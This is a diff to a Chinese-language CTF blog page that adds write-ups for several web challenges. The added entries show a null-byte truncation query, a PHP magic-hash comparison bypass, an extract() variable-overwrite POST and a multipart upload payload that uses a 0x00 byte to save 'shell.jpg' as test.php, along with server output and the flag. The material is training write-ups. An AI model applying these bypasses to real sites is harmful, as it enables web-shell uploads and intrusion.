@@ -54,7 +54,7 @@
 <body class="" data-mz="">
     <header class="site-header">
         <div class="container">
-            <h1><a href="http://localhost:4000/" title="Evil"><span class="octicon octicon-terminal"></span> Evil</a></h1>
+            <h1><a href="http://localhost:4000/" title="Evil"><span class="octicon octicon-hubot"></span> Evil</a></h1>
             <button class="collapsed mobile-visible" type="button" onclick="toggleMenu();">
               <span class="icon-bar"></span>
               <span class="icon-bar"></span>
@@ -185,7 +185,108 @@
 
 <p><a href="https://pengyang.me/2018/08/17/slmap1/">https://pengyang.me/2018/08/17/slmap1/</a></p>
 
-<h2 id="15">15.</h2>
+<h2 id="15x00">15./x00</h2>
+
+<p>我开始直接用 <code class="highlighter-rouge">%00</code>截断的时候没有成功，然后换了一种方法</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?nctf[]=1
+</code></pre></div></div>
+
+<p>后来发现<code class="highlighter-rouge">#</code>需要编码</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nctf=1%00%23biubiubiu
+</code></pre></div></div>
+
+<h2 id="16-bypass-again">16. bypass again</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?a=QNKCDZO&amp;b=240610708
+</code></pre></div></div>
+
+<h2 id="17变量覆盖">17.变量覆盖</h2>
+
+<p>extract变量覆盖，POST <code class="highlighter-rouge">pass=&amp;thepassword_123=</code></p>
+
+<h2 id="18php是世界上最好的语言">18.PHP是世界上最好的语言</h2>
+
+<p>&lt;font color=red&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;</p>
+
+<h2 id="19伪装者">19.伪装者</h2>
+
+<p>XXF</p>
+
+<p>我一眼看上去就知道是 XXF，但是居然试了很多次都没有成功，别人也是这样做的就成功了，<strong>可能题目坏掉了。</strong></p>
+
+<h2 id="20header">20.Header</h2>
+
+<p>&lt;font color=red&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;</p>
+
+<h2 id="21上传绕过">21.上传绕过</h2>
+
+<p><strong>payload:</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------8005181633237170861136986551
+Content-Disposition: form-data; name="dir"
+
+/uploads/test.php+空格   ---&gt; hex:"20"-"00"
+-----------------------------8005181633237170861136986551
+Content-Disposition: form-data; name="file"; filename="shell.jpg"
+Content-Type: text/php
+</code></pre></div></div>
+
+<p>分析:</p>
+
+<p>step1:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/uploads/test.php
+-----------------------------8005181633237170861136986551
+Content-Disposition: form-data; name="file"; filename="shell.jpg "
+Content-Type: text/php
+</code></pre></div></div>
+
+<p>回显</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Array
+(
+    [0] =&gt; .jpg
+    [1] =&gt; jpg
+)
+Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+  ["dirname"]=&gt;
+  string(9) "./uploads"
+  ["basename"]=&gt;
+  string(17) "test.phpshell.jpg"
+  ["extension"]=&gt;
+  string(3) "jpg"
+  ["filename"]=&gt;
+  string(13) "test.phpshell"
+}
+&lt;br&gt;必须上传成后缀名为php的文件才行啊！&lt;br&gt;
+</code></pre></div></div>
+
+<p>step2: 使用 payload</p>
+
+<p>回显</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Array
+(
+    [0] =&gt; .jpg
+    [1] =&gt; jpg
+)
+Upload: shell.jpg&lt;br /&gt;Type: text/php&lt;br /&gt;Size: 0.2861328125 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
+  ["dirname"]=&gt;
+  string(9) "./uploads"
+  ["basename"]=&gt;
+  string(8) "test.php"
+  ["extension"]=&gt;
+  string(3) "php"
+  ["filename"]=&gt;
+  string(4) "test"
+}
+&lt;br&gt;恭喜你获得flag一枚：&lt;br&gt;flag:nctf{welcome_to_hacks_world}
+</code></pre></div></div>
+
+<p>通过回显内容的对比可以看到，这里截断就是要截断<code class="highlighter-rouge">test.phpshell.jpg</code>从而绕过后台的验证。</p>
+
 
     </article>
   
@@ -195,7 +296,7 @@
   <b>上一篇: <a href="/2018/08/13/bk_ng/">never give up(Bugku)</a></b><br>
      
   
-  <b>下一篇: <a href="/2018/08/17/slmap1/">sqlmap系列(一)</a></b>
+  <b>下一篇: <a href="/2018/08/17/jd00/">00截断上传</a></b>
    
 </div><!--上一篇 下一篇-->
 
